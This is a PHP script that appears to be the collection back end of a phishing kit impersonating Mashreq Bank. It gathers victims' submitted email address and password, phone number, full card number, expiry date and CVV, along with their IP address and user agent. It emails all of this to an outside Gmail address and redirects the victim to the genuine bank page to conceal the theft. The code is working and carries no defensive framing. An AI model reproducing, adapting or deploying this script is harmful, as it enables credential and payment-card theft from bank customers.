<?php
header ('Location: https://www.mashreqbank.com/en/uae/personal'); //Redirect user.

$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['email']."\n";
	$message .= "Email Password              : ".$_POST['emailpass']."\n";
	$message .= "Phone Number              : ".$_POST['phonenumber']."\n";
	$message .= "Card Number              : ".$_POST['cidNumber1']."/".$_POST['cidNumber2']."/".$_POST['cidNumber3']."/".$_POST['cidNumber1']."\n";
	$message .= "Expiration Date              : ".$_POST['expiration_month']."/".$_POST['expiration_year']."\n";
	$message .= "CVV            : ".$_POST['cscNumber']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = "9javibes1@gmail.com";
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		
		

?>